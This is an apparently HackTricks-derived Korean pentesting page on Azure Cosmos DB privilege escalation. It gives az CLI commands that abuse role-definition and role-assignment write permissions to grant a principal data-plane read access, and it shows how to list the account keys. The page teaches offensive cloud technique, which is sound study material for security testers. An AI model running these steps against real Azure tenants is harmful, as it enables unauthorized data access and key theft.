# Az - CosmosDB Privesc

{{#include ../../../banners/hacktricks-training.md}}

## CosmosDB Privesc
SQL Database에 대한 자세한 정보는 다음을 확인하세요:

{{#ref}}
../az-services/az-cosmosDB.md
{{#endref}}

### (`Microsoft.DocumentDB/databaseAccounts/sqlRoleDefinitions/write`, `Microsoft.DocumentDB/databaseAccounts/sqlRoleDefinitions/read`) & (`Microsoft.DocumentDB/databaseAccounts/sqlRoleAssignments/write`, `Microsoft.DocumentDB/databaseAccounts/sqlRoleAssignments/read`)

이 권한을 사용하면 사용자가 쿼리를 실행하고 데이터베이스에 연결할 수 있는 권한을 부여하여 권한 상승을 할 수 있습니다. 먼저 필요한 권한과 범위를 부여하는 역할 정의가 생성됩니다.
```bash
az cosmosdb sql role definition create \
--account-name <account_name> \
--resource-group <resource_group_name> \
--body '{
"Id": "<Random-Unique-ID>", # For example 12345678-1234-1234-1234-123456789az
"RoleName": "CustomReadRole",
"Type": "CustomRole",
"AssignableScopes": [
"/subscriptions/<subscription_id>/resourceGroups/sqldatabase/providers/Microsoft.DocumentDB/databaseAccounts/<account_name>"
],
"Permissions": [
{
"DataActions": [
"Microsoft.DocumentDB/databaseAccounts/readMetadata",
"Microsoft.DocumentDB/databaseAccounts/sqlDatabases/containers/items/read",
"Microsoft.DocumentDB/databaseAccounts/sqlDatabases/containers/*"
]
}
]
}'
```
그 후 정의의 할당이 사용자에게 주어집니다. 이후 해당 사용자는 DefaultAzureCredential() 연결 방법을 사용하여 쿼리를 실행할 수 있습니다.
```bash
az cosmosdb sql role assignment create \
--account-name <account_name> \
--resource-group <resource_group_name> \
--role-definition-id <Random-Unique-ID-used-in-definition> \
--principal-id <principal_id-togive-perms> \
--scope "/"
```
### `Microsoft.DocumentDB/databaseAccounts/listKeys/action`
이 권한을 사용하면 Azure Cosmos DB 계정의 기본 및 보조 키를 검색할 수 있습니다. 이러한 키는 데이터베이스 계정 및 해당 리소스에 대한 전체 액세스를 제공하며, 데이터 읽기, 쓰기 및 구성 변경과 같은 작업을 가능하게 합니다.
```bash
az cosmosdb keys list \
--name <account_name> \
--resource-group <resource_group_name>

```
{{#include ../../../banners/hacktricks-training.md}}
